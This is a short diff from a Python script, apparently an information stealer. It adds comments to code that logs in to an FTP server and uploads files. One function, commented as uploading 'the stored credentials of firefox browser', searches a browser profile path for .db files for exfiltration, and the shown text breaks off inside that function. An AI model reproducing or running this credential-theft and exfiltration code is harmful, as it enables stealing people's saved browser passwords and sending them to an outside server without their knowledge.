@@ -2,6 +2,8 @@ from ftplib import FTP
 from data import ftp_address,ftp_username,ftp_password, location_credentials
 import os
 from time import time
+
+# Upload data to a ftp server
 def upload_file(filename):
     ftp = FTP(ftp_address)
     ftp.login(ftp_username,ftp_password)
@@ -9,6 +11,7 @@ def upload_file(filename):
         ftp.storbinary(f"STOR {filename.split('/')[-1]+f"{round(time())}"}", file)
     ftp.quit()
 
+# Upload the stored credentials of firefox browser
 def upload_credentials():
     location = os.path.expanduser(location_credentials)
     temp = glob.glob(location + "/**/*.db",recursive = True)
